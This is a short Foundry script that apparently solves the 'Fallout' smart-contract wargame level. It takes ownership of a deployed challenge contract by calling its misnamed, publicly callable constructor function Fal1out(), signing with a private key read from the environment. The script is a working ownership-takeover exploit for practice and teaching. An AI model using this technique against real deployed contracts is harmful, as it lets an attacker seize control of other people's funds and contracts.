// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Fallout} from "src/Fallout.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract FalloutSolution is Script {
    Fallout public fallout = Fallout(payable(0x72D99E83E8165A50077e0a0F7c09d66E2b511085));
    // Fallout public fallout = new Fallout();

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallout.Fal1out();
        console.log("Owner address:", fallout.owner());
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
